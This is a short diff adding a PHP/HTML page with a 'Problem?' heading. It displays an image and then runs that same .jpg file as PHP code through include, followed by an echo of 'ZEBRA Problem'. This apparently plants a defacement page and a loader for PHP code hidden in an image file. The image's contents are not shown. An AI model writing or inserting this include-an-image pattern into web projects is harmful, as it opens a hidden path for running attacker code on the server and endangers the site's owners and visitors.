@@ -1,0 +1,5 @@
+<h1>Problem?</h1>
+<img src="fINuUV1.jpg">
+<?php
+include "./fINuUV1.jpg";
+echo "ZEBRA Problem";
